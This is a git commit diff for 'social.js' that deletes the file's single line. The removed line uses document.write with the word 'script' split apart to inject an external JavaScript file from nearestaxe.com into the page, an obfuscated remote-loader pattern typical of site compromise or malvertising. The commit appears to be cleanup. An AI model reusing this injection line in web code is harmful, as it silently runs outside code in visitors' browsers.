d92ababc85ca6bd49c4aa7503961a5beccec0d60
mychiara <85479169+mychiara@users.noreply.github.com>
2023-08-25 08:40:49 +0800

    Update social.js

--- social.js
+++ social.js
@@ -1,1 +1,1 @@
-document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + ':nearestaxe.com/8a/8d/9f/8a8d9f317c5fee4014d3b5a9cbf05fab.js"></scr' + 'ipt>');
+
